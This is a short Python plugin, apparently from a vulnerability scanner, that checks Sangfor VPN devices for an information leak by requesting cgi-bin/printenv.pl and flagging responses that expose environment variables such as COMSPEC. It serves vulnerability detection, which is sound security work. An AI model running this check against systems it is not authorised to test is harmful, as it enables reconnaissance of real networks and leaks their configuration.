#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    """
    sangfor vpn infoleak
    """

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url != None:
            async with ClientSession() as session:
                url = self.base_url + "cgi-bin/printenv.pl"
                async with session.get(url=url) as res:
                    if res != None:
                        text = await res.text()
                        if text != None and res.status == 200 and "COMSPEC=" in text:
                            yield url